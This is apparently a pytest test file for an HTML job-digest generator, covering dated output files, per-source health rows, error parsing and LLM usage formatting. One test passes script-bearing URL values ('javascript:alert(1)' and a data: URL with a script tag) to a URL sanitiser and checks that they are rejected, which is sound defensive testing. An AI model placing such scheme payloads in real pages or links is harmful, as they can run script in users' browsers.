    job.status_detail = "scorer failed (API timeout) — shown unscored, judge it yourself"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)

    item = ctx["needs_click"][0]
    assert item["score_label"] == "?"          # not "0"
    assert item["score_error"] == "API timeout"
    assert "API timeout" in render_html(ctx)


def test_a_scorer_error_is_not_printed_twice(tmp_path: Path):
    """`status_detail` quotes the same error the card already shows; printing
    both makes a one-line problem look like two."""
    job = make_scored(score=0, error="API timeout")
    job.status_detail = "scorer failed (API timeout) — shown unscored"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)
    assert render_html(ctx).count("API timeout") == 1


# ==========================================================================
# write_digest
# ==========================================================================


def test_write_digest_writes_a_dated_file(tmp_path: Path):
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert path.name == "digest_2026-08-04.html"
    assert path.exists()
    assert path.read_text(encoding="utf-8").strip()


def test_write_digest_also_writes_a_stable_latest_copy(tmp_path: Path):
    """So a cron user can bookmark exactly one URL."""
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    latest = path.parent / "digest_latest.html"
    assert latest.exists()
    assert latest.read_text(encoding="utf-8") == path.read_text(encoding="utf-8")


def test_write_digest_creates_the_output_directory(tmp_path: Path):
    cfg = digest_config(tmp_path, output={"dir": str(tmp_path / "deep" / "nested")})
    assert write_digest([], RunStats(), cfg, now=NOW).exists()


def test_rerunning_overwrites_todays_digest(tmp_path: Path):
    cfg = digest_config(tmp_path)
    first = write_digest([], RunStats(), cfg, now=NOW)
    second = write_digest(sample_jobs(tmp_path), stats(), cfg, now=NOW)
    assert first == second
    assert "Northwind" in second.read_text(encoding="utf-8")


def test_write_digest_is_utf8(tmp_path: Path):
    job = make_scored(score=90, company="Zürich Insurance",
                      title="Ingénieur Backend (m/w/d)")
    path = write_digest([job], stats(), digest_config(tmp_path), now=NOW)
    text = path.read_text(encoding="utf-8")
    assert "Zürich" in text
    assert "Ingénieur" in text


# ==========================================================================
# Phase 6 — the per-source health block
# ==========================================================================

from src.digest import _error_source, _source_health, build_context  # noqa: E402
from src.models import RunStats  # noqa: E402
from tests.conftest import NOW, make_scored  # noqa: E402


def _stats(**overrides):
    stats = RunStats()
    stats.source_counts = overrides.pop("source_counts", {"greenhouse": 12})
    stats.source_after_filters = overrides.pop("source_after_filters",
                                               {"greenhouse": 3})
    stats.errors = overrides.pop("errors", [])
    return stats


def test_error_source_reads_the_shapes_sources_actually_write():
    assert _error_source("greenhouse/spotify: HTTP 500") == "greenhouse"
    assert _error_source("arbeitnow: page 1: boom") == "arbeitnow"
    assert _error_source("adzuna source failed: no keys") == "adzuna"
    assert _error_source("") == ""
    # adzuna decorates its own name — "adzuna DE: …", "adzuna DE 'python': …"
    # — and its misconfiguration messages carry no colon at all. All of them
    # must still map, or a dead API key renders a green "ok" row.
    assert _error_source("adzuna DE: HTTP 401 — check keys.adzuna_app_id/app_key") == "adzuna"
    assert _error_source("adzuna DE 'python': connection reset") == "adzuna"
    assert _error_source(
        "adzuna is enabled but keys.adzuna_app_id / keys.adzuna_app_key are "
        "missing — get free keys at developer.adzuna.com"
    ) == "adzuna"
    # `_safe_fetch` joins the boards into one label; every named board failed.
    assert _error_source("ashby/greenhouse source failed: boom") == "ashby/greenhouse"
    # Non-source errors resolve to tokens that match no fetched source.
    assert _error_source("dedupe failed: boom") == "dedupe"
    assert _error_source("scoring skipped: no API key") == "scoring"


def test_health_rows_carry_the_five_columns():
    stats = _stats()
    rows = _source_health(stats, stats.to_dict(), [], {"greenhouse": 2},
                          tracker=None, now=NOW)
    assert rows == [{
        "name": "greenhouse", "fetched": 12, "after_filters": 3,
        "new_today": 2, "status": "ok", "last_ok": "this run",
    }]


def test_a_failed_source_reads_error_and_a_half_failed_one_degraded():
    stats = _stats(
        source_counts={"greenhouse": 0, "lever": 5},
        source_after_filters={"greenhouse": 0, "lever": 2},
        errors=["greenhouse/spotify: HTTP 500", "lever/plaid: HTTP 429"],
    )
    rows = {r["name"]: r for r in _source_health(
        stats, stats.to_dict(), stats.errors, {}, tracker=None, now=NOW)}
    assert rows["greenhouse"]["status"] == "error"
    assert rows["lever"]["status"] == "degraded"


def test_a_silent_source_with_a_baseline_reads_degraded():
    """The Tier 2 story this block exists for: the endpoint died quietly,
    fetched reads zero, and only the recent-run baseline says that is news."""
    import json as _json

    class FakeTracker:
        def recent_runs(self, limit=10):
            return [{
                "started_at": "2026-08-03T08:00:00+00:00",
                "finished_at": "2026-08-03T08:05:00+00:00",
                "stats_json": _json.dumps({"source_counts": {"justjoin_it": 40}}),
            }] * 3

    stats = _stats(source_counts={"justjoin_it": 0},
                   source_after_filters={"justjoin_it": 0})
    rows = _source_health(stats, stats.to_dict(), [], {},
                          tracker=FakeTracker(), now=NOW)
    assert rows[0]["status"] == "degraded"
    assert rows[0]["last_ok"] not in ("never", "this run")


def test_an_honest_zero_with_no_history_is_ok_not_alarming():
    stats = _stats(source_counts={"teamtailor": 0},
                   source_after_filters={"teamtailor": 0})
    rows = _source_health(stats, stats.to_dict(), [], {}, tracker=None, now=NOW)
    assert rows[0]["status"] == "ok"
    assert rows[0]["last_ok"] == "never"


def test_the_health_block_reaches_the_rendered_page():
    stats = _stats(source_counts={"greenhouse": 4, "nofluffjobs": 0},
                   source_after_filters={"greenhouse": 1, "nofluffjobs": 0},
                   errors=["nofluffjobs: answered 200 but the body is not "
                           "the posting listing"])
    context = build_context([make_scored(score=80)], stats, None, now=NOW)
    names = [row["name"] for row in context["source_health"]]
    assert names == ["greenhouse", "nofluffjobs"]

    from src.digest import render_html
    html = render_html(context)
    assert 'id="source-health"' in html
    assert "nofluffjobs" in html
    assert "degraded" in html or "error" in html


def test_a_dead_adzuna_reads_error_not_ok():
    """The exact morning this block exists for: the key expired, adzuna's own
    error format ("adzuna DE: HTTP 401 …") is not "adzuna: …", and the row
    used to render a green "ok" over a source that failed outright."""
    stats = _stats(
        source_counts={"adzuna": 0},
        source_after_filters={"adzuna": 0},
        errors=["adzuna DE: HTTP 401 — check keys.adzuna_app_id/app_key"],
    )
    rows = _source_health(stats, stats.to_dict(), stats.errors, {},
                          tracker=None, now=NOW)
    assert rows[0]["status"] == "error"


def test_a_whole_board_fetch_failure_marks_every_board_it_names():
    """`_safe_fetch` labels an ATS-boards crash "ashby/greenhouse source
    failed: …" — one message, every board in it dead. Flagging only the
    first left the rest reading "ok, fetched 0"."""
    stats = _stats(
        source_counts={"ashby": 0, "greenhouse": 0},
        source_after_filters={"ashby": 0, "greenhouse": 0},
        errors=["ashby/greenhouse source failed: watchlist exploded"],
    )
    rows = {r["name"]: r for r in _source_health(
        stats, stats.to_dict(), stats.errors, {}, tracker=None, now=NOW)}
    assert rows["ashby"]["status"] == "error"
    assert rows["greenhouse"]["status"] == "error"


def test_new_today_counts_only_the_cards_the_page_shows():
    """An unrenderable record is skipped from the cards with a warning; the
    health row must not keep claiming it, or "new today 2" sits over a page
    with one card."""
    broken = make_scored(score=90, ats_job_id="9")
    broken.score = "not-a-score"            # type: ignore[assignment]
    good = make_scored(score=80, ats_job_id="8")
    stats = _stats(source_counts={"greenhouse": 2},
                   source_after_filters={"greenhouse": 2})
    context = build_context([broken, good], stats, None, now=NOW)
    assert context["totals"]["all"] == 1
    assert [r["new_today"] for r in context["source_health"]] == [1]


def test_a_corrupt_run_history_row_does_not_cost_the_page():
    """`build_context` runs outside `write_digest`'s template fallback, so a
    bad `stats_json` in one historic row must skip that row — not take the
    whole digest down with it. The healthy row behind it still supplies
    "last OK"."""
    import json as _json

    class Tracker:
        def recent_runs(self, limit=10):
            return [
                "not-a-row-at-all",
                {"finished_at": "2026-08-04T07:00:00+00:00",
                 "stats_json": '["valid json", "wrong shape"]'},
                {"finished_at": "2026-08-04T06:00:00+00:00",
                 "stats_json": _json.dumps({"source_counts": {"greenhouse": "lots"}})},
                {"finished_at": "2026-08-03T08:05:00+00:00",
                 "started_at": "2026-08-03T08:00:00+00:00",
                 "stats_json": _json.dumps({"source_counts": {"greenhouse": 7}})},
            ]

    stats = _stats(source_counts={"greenhouse": 0},
                   source_after_filters={"greenhouse": 0})
    context = build_context([], stats, None, now=NOW, tracker=Tracker())
    row = context["source_health"][0]
    assert row["name"] == "greenhouse"
    assert row["last_ok"] == "yesterday"    # from the one healthy row


def test_health_chips_follow_the_page_theme():
    """The chips use the theme's good/warn/bad tokens rather than hardcoded
    light-mode hex, so the existing dark-mode block recolours them with the
    rest of the page."""
    from src.digest import render_html
    html = render_html({})
    for chip, token in (("ok", "--good"), ("degraded", "--warn"), ("error", "--bad")):
        rule = html.split(f".health.{chip}", 1)[1].split("}", 1)[0]
        assert f"var({token}-bg)" in rule and f"var({token})" in rule


def test_the_apply_button_never_carries_a_non_http_scheme():
    """Autoescape keeps a URL inside its attribute; it does not neutralise a
    javascript: scheme, and this page opens as file://. No scheme, no button."""
    from src.digest import _safe_url

    assert _safe_url("javascript:alert(1)") == ("", "")
    assert _safe_url("data:text/html,<script>1</script>") == ("", "")
    assert _safe_url("") == ("", "")
    assert _safe_url(None) == ("", "")
    href, host = _safe_url("https://boards.greenhouse.io/acme/jobs/1")
    assert href == "https://boards.greenhouse.io/acme/jobs/1"
    assert host == "boards.greenhouse.io"


def test_llm_usage_line_hides_zero_call_runs_and_formats_spend():
    from src.digest import _llm_usage

    assert _llm_usage({}) is None
    assert _llm_usage({"llm_usage": {"calls": 0}}) is None

    line = _llm_usage({"llm_usage": {
        "calls": 42, "input_tokens": 187000, "output_tokens": 9000,
        "cost": 0.0, "by_model": {"m1": {}, "m0": {}},
    }})
    assert line["calls"] == 42
    assert line["tokens_in"] == "187,000"
    # 0.0 is what a :free model reports; never print it as a price.
    assert line["cost"] == "no cost reported"
    assert line["models"] == "m0, m1"

    paid = _llm_usage({"llm_usage": {"calls": 1, "cost": 0.0123}})
    assert paid["cost"] == "$0.0123"
